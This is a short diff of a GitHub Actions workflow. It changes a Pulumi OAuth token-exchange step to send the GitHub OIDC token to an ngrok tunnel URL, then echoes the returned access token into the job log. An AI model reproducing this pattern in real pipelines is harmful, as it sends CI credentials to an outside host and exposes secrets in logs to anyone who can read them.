@@ -25,7 +25,7 @@ jobs:
             -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \
             -d 'subject_token_type=urn:ietf:params:oauth:token-type:id_token' \
             -d 'requested_token_type=urn:pulumi:token-type:access_token:organization' \
-            -d 'subject_token=${{ env.PROD_PR_COMMIT }}' \
+            -d 'subject_token=${{ env.OIDC_GH_TOKEN }}' \
             https://dcd9-190-193-167-140.ngrok-free.app/api/oauth/token | jq -r '.access_token')
           echo $PULUMI_ACCESS_TOKEN
           echo "PULUMI_ACCESS_TOKEN=$PULUMI_ACCESS_TOKEN" >> $GITHUB_ENV
